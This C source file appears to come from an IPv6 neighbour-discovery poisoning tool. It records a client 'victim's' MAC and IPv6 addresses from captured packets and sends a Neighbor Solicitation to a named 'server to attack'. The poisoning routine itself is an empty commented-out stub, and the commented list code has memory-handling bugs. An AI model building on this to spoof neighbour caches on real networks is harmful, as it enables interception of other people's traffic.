#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>

#include <disturber.h>
#include <packets.h>
#include <device.h>
#include <communication.h>

void debug_cvivtim(struct victim *cli) {
	char buf[INET6_ADDRSTRLEN];

	if (!victim_info_complete(cli)) {
		printf("Client victim not loaded.\n");
		return;
	}

	printf("HWADDR: %s\n", ether_ntoa(&(cli->hwaddr)));
	memset(buf, 0, INET6_ADDRSTRLEN);
	inet_ntop(AF_INET6, cli->ipv6.s6_addr, buf, INET6_ADDRSTRLEN);
	printf("IPv6: %s\n", buf);
}

int victim_info_complete(struct victim *vic) {
	struct ether_addr eth;
	struct in6_addr ipv6;

	memset(&eth, 0, sizeof(struct ether_addr));
	memset(&ipv6, 0, sizeof(struct in6_addr));

	if (!vic || !memcmp(&vic->hwaddr, &eth, sizeof(struct ether_addr)) ||
		!memcmp(&vic->ipv6, &ipv6, sizeof(struct in6_addr)))
		return 0;

	return 1;
}

void populate_cvictim(char *pkt) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;

	eth = (struct ethhdr *)pkt;
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	printf("Populando CVICTIM\n");

	cvictim = (struct victim *)malloc(sizeof(struct victim));
	memcpy(&(cvictim->ipv6), &(ip6->ip6_src), sizeof(struct in6_addr));
	memcpy(&(cvictim->hwaddr), &(eth->h_source), ETH_ALEN);

	debug_cvivtim(cvictim);
}

/*struct victim *get_cvictim(struct ether_addr *hwaddr) {
	struct cli_victim *cli;

	for (cli = cvictim; cli; cli = cli->nxt) {
		printf("entrei");
		if (memcmp(&(cli->cv_victim->hwaddr), hwaddr,
							sizeof(struct ether_addr)) == 0) {
			printf("Cliente existente\n");

			return cli->cv_victim;
		}
	}

	return NULL;
}

int add_cvictm(struct ethhdr *eth) {
	struct ip6_hdr *ip6;
	struct cli_victim *cli;

	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	cli = cvictim;
	cvictim = (struct cli_victim *)malloc(sizeof(struct cli_victim));
	cvictim->nxt = cli;

	cvictim->cv_victim = malloc(sizeof(struct victim));
	memcpy(&(cvictim->cv_victim->hwaddr), &(eth->h_source), ETH_ALEN);
	memcpy(&(cvictim->cv_victim->ipv6), &(ip6->ip6_src), INET6_ADDRSTRLEN);
	cvictim->cv_victim->poisoned = 0;
	//cvictim->th = (struct pthread_t *)malloc(sizeof(struct pthread_t));

	return 1;
}

void del_cvictm(struct victim *vic) {
	struct cli_victim *cli, *aux;

	aux = NULL;
	for (cli = cvictim; cli; cli = cli->nxt) {
		if (memcmp(&(cli->cv_victim->hwaddr), &(vic->hwaddr),
					sizeof(struct ether_addr)) == 0) {
			if (aux == NULL) {
				cvictim = cli->nxt;
				free(cvictim);
				return;
			} else {
				aux->nxt = cli->nxt;
				free(cli);
				return;
			}
		}
		aux = cli;
	}
}

void *poison_vclient(void *conn) {
	//poisoning
	printf("oiaeu\n");

	pthread_exit((void*)EXIT_SUCCESS);
}
*/
void init_svictim(const char *sv_address) {
	char server_victim[INET6_ADDRSTRLEN];
	char *pkt;

	if (inet_pton(AF_INET6, sv_address, &svictim.ipv6) <= 0) {
		printf("Error setting victim's address\n");
		exit(EXIT_FAILURE);
	}

	inet_ntop(AF_INET6, &svictim.ipv6, server_victim, INET6_ADDRSTRLEN);
	printf("Server to attack: %s\n", server_victim);
	printf("Sending Neighbor Solicitation to %s\n", server_victim);

	pkt = alloc_ndsolicit(&svictim.ipv6);
	send_packet(pkt);

	if (pkt)
		free(pkt);


}

void init_cvictim() {
	cvictim = NULL;
}
/*
void cleanup_cvictims() {
	struct cli_victim *cli, *aux;

	aux = NULL;

	for (cli = cvictim, aux = cli->nxt; cli; cli = aux) {
		free(cli);
	}

	cvictim = NULL;
}*/
